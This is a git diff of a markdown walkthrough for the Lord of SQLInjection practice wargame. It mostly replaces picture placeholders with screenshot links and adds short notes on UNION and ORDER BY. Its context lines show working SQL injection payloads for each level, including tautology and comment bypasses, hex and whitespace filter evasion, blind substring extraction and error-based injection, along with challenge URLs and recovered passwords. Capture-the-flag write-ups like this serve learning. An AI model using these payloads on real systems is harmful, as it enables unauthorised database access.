@@ -16,7 +16,7 @@ give a true condition and comment out the rest
 select id from prob_gremlin where id='hello'OR 1=1--' and pw='00'
 ```
 
-(PICTURE)
+
 
 ---
 
@@ -31,8 +31,6 @@ since password was unknow we comment out the rest
 select id from prob_cobolt where id='admin'-- -' and pw=md5('')
 ```
 
-(PICTURE)
-
 ---
 
 ## 3. Goblin
@@ -44,7 +42,6 @@ since quotes canot be used it was found that hex can be kept since it is interpr
 select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
 ```
 
-(PICTURE)
 
 ---
 
@@ -79,8 +76,7 @@ https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%
 ```
 select id from prob_wolfman where id='guest' and pw='' or id ='admin'-- -'
 ```
-
-(PICTURE)
+<img width="940" height="329" alt="image" src="https://github.com/user-attachments/assets/b4937343-361a-4b30-806d-cbb2d5b728ad" />
 
 ---
 
@@ -102,13 +98,13 @@ select id from prob_darkelf where id='guest' and pw=''||id='admin' -- -'
 ## 7. Orge
 
 The && symbol doesn't work in a Uniform Resource Locator (URL) since it is a reserve character (%26)
+<img width="940" height="329" alt="image" src="https://github.com/user-attachments/assets/5f21f7e0-1333-4c51-bdb5-ffa627b3efba" />
 
 **query :**
 ```
 select id from prob_orge where id='guest' and pw='7b751aec'
 ```
 
-(PICTURE)
 
 ---
 
@@ -121,7 +117,7 @@ Sql is not case senstitive
 select id from prob_troll where id='Admin'
 ```
 
-(PICTURE)
+
 
 ---
 
@@ -134,7 +130,7 @@ we hide admin wich is separated by an admin in between them
 aadmindmin
 ```
 
-```
+```url
 https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin
 ```
 
@@ -143,7 +139,6 @@ https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adad
 select id from prob_vampire where id='admin'
 ```
 
-(PICTURE)
 
 ---
 
@@ -156,13 +151,15 @@ select id from prob_skeleton where id='guest' and pw='' || id='admin'-- -' and 1
 
 nothing much
 
-(PICTURE)
+
 
 ---
 
 ## 11. Golem
 
 Since “=” was blocked we have to use “LIKE”
+<img width="940" height="813" alt="image" src="https://github.com/user-attachments/assets/709a52ca-1f68-4c53-ba29-09b9a714185c" />
+
 
 **query :**
 ```
@@ -176,7 +173,6 @@ length is 8
 select id from prob_golem where id='guest' and pw='' || id LIKE 'admin' && substring(pw, 1, 1) LIKE '1' -- -'
 ```
 
-(PICTURE)
 
 ---
 
@@ -197,17 +193,21 @@ select id from prob_darkknight where id='guest' and pw='' and no=0 OR id LIKE 0x
 pw len is 8 (as usual)
 
 substr is blocked so mid is used
+<img width="940" height="358" alt="image" src="https://github.com/user-attachments/assets/d6345742-a284-4887-9ab2-9b30889a3792" />
+
 
 **query :**
 ```
 select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
 ```
 
-(PICTURE)
 
 ---
 
 ## 13. BugBear
+
+<img width="940" height="289" alt="image" src="https://github.com/user-attachments/assets/7c43a3b6-f12b-4d42-a77d-28cb008ebb16" />
+
 
 Since space is blocked we use tab(%09)
 
@@ -222,7 +222,7 @@ select id from prob_bugbear where id='guest' and pw='' and no=0||id IN("admin")&
 
 password: **52dc3991**
 
-(PICTURE)
+
 
 ---
 
@@ -236,11 +236,14 @@ Vertical tab (%0B) worked
 https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0B
 ```
 
-(PICTURE)
+
 
 ---
 
 ## 15. Assasin
+
+<img width="940" height="835" alt="image" src="https://github.com/user-attachments/assets/995eada1-f952-45f8-a41a-b174643ac9e3" />
+
 
 In SQL, the percent sign (%) is the wildcard character used to represent zero, one, or multiple characters in a string search
 
@@ -253,7 +256,7 @@ https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=902
 select id from prob_assassin where pw like '902%'
 ```
 
-(PICTURE)
+
 
 ---
 
@@ -272,7 +275,6 @@ The SQL engine keeps looking for the next unescaped single quote to end the stri
 select id from prob_succubus where id='0&?id=\' and pw=' OR 1=1 -- -'
 ```
 
-(PICTURE)
 
 ---
 
@@ -289,7 +291,6 @@ Trial and error
 select id from prob_zombie_assassin where id='"\' and pw='or 1=1 -- -'\ '
 ```
 
-(PICTURE)
 
 ---
 
@@ -314,7 +315,6 @@ using union we print it out
 우왕굳
 ```
 
-(PICTURE)
 
 ---
 
@@ -329,13 +329,26 @@ It shows # which is used to comment out the line so we start a new line
 select id from prob_dragon where id='guest'# and pw='' AND pw='1110' OR id='admin'-- -'
 ```
 
-(PICTURE)
 
 ---
 
 ## 21. Iron_golem
 
 Since sleep and benchmark are filtered, this is an Error-Based SQL Injection challenge.
+
+```
+The UNION operator is used to combine the result-set of two or more SELECT statements.
+The UNION operator automatically removes duplicate rows from the result set.
+Requirements for UNION:
+•	Every SELECT statement within UNION must have the same number of columns
+•	The columns must also have similar data types
+•	The columns in every SELECT statement must also be in the same order
+UNION Syntax
+SELECT column_name(s) FROM table1
+UNION
+SELECT column_name(s) FROM table2;
+
+```
 
 **query :**
 ```
@@ -349,7 +362,8 @@ It intentionally creates a multi-row response
 select id from prob_iron_golem where id='admin' and pw=' OR IF(substr(pw,1,1)=9, (select 1 union select 2), 1) -- -'
 ```
 
-(PICTURE)
+<img width="940" height="267" alt="image" src="https://github.com/user-attachments/assets/611c2793-e0e9-4da8-bc00-9ed32b60e7ff" />
+
 
 ---
 
@@ -368,14 +382,16 @@ select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELE
 ```
 select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw,1,1)=0) -- -'
 ```
-
-(PICTURE)
+<img width="940" height="208" alt="image" src="https://github.com/user-attachments/assets/41ae7c6e-a6ef-430e-86e7-07b07a5c8faa" />
 
 ---
 
 ## 23. Hell_fire
 
-The ORDER BY keyword sorts the records in ascending order by default.
+The ORDER BY keyword sorts the records in ascending order by default. To sort the records in descending order, use the DESC keyword.
+
+<img width="531" height="161" alt="image" src="https://github.com/user-attachments/assets/54ce9e7f-b39f-40db-908f-c23f74f54dbe" />
+
 
 **query :**
 ```
